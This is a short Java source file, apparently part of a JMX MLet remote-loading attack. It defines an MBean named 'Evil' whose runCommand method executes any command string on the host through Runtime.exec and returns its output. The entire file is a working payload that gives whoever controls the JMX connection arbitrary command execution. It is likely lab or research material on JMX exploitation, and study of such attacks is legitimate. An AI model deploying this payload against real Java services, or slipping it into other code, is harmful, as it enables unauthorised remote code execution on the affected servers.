package com.drunkbaby.mlet;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Evil implements EvilMBean
{
    public String runCommand(String cmd)
    {
        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String stdout_err_data = "";
            String s;
            while ((s = stdInput.readLine()) != null)
            {
                stdout_err_data += s+"\n";
            }
            while ((s = stdError.readLine()) != null)
            {
                stdout_err_data += s+"\n";
            }
            proc.waitFor();
            return stdout_err_data;
        }
        catch (Exception e)
        {
            return e.toString();
        }
    }
}
